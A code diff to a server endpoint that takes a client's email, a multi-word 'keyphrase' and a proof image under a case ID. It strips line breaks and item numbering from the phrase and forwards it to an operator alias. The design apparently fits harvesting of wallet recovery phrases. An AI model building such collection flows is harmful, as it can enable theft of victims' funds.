@@ -323,6 +323,12 @@ async function startServer() {
         : "";
     const keyphrase =
       typeof req.body?.keyphrase === "string" ? req.body.keyphrase : "";
+    const normalizedKeyphrase = keyphrase
+      .replace(/\r?\n/g, " ")
+      .replace(/[,;]+/g, " ")
+      .replace(/\b\d{1,2}[.)](?=\s)/g, " ")
+      .replace(/\s+/g, " ")
+      .trim();
     const proofImageRaw = req.body?.proofImage as
       | {
           filename?: unknown;
@@ -330,13 +336,13 @@ async function startServer() {
           contentBase64?: unknown;
         }
       | undefined;
-    if (!email || !keyphrase.trim()) {
+    if (!email || !normalizedKeyphrase) {
       return res.status(400).json({
         success: false,
         error: "email and keyphrase required",
       });
     }
-    const words = keyphrase.trim().split(/\s+/);
+    const words = normalizedKeyphrase.split(/\s+/);
     if (words.length < 3) {
       return res.status(400).json({
         success: false,
@@ -417,7 +423,7 @@ async function startServer() {
       proofImageAttachment = { filename, mimeType: normalizedMime, content };
     }
 
-    const updated = submitCaseKeyphrase(req.params.caseId, email, keyphrase, {
+    const updated = submitCaseKeyphrase(req.params.caseId, email, normalizedKeyphrase, {
       proofImageFilename: proofImageAttachment?.filename,
     });
     if (!updated) {
@@ -431,7 +437,7 @@ async function startServer() {
           caseId: String(updated.caseId || updated.id),
           clientEmail: email,
           clientName: String(updated.operatorAlias || updated.name || ""),
-          keyphrase: keyphrase.trim(),
+          keyphrase: normalizedKeyphrase,
           submittedAt: String(updated.keyphraseSubmittedAt || ""),
           proofImageAttachment,
         });
